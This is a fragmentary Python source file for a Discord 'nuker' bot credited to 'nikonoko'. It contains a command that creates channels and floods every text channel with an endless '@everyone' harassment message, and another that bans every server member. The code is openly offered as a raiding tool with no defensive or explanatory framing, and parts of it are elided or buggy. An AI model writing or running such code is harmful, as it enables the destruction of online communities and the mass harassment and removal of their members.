import sys, discord, requests, json, threading, random, asyncio, aiohttp, time, os, socket, time, colorama
...
_______ _______ _______  ______ _______ _____ __   _  ______
...
"""
print(Colorate.Vertical(Colors.green_to_white, wowstartsunlol))

def loadningstart(text, delay=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
        
loadningstart("lodaning sun")
...
os.system("sun nuker | by nikonoko")
login ="""
                          ██╗░░░░░░█████╗░░██████╗░░██████╗░██╗███╗░░██╗
                          ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██║████╗░██║
                          ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░██║██╔██╗██║
...
async def nuke(ctx):
    ...
    for i in range(15):
        await ctx.guild.create_text_channel("wow")

    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            while True:
                await channel.send("@everyone gc is an terrorist")
...
@bot.command()
async def mb(ctx):
    ignored_user_id = 1109095459882012682, 1160840191158780044

    try:
        for member in ctx.guild.members:
            if member.id == ignored_user_id:
                print(Fore.YELLOW + f"Ignoring user {member} with ID {ignored_user_id}")
                continue  

            await member.ban(reason="Nuked By niko")
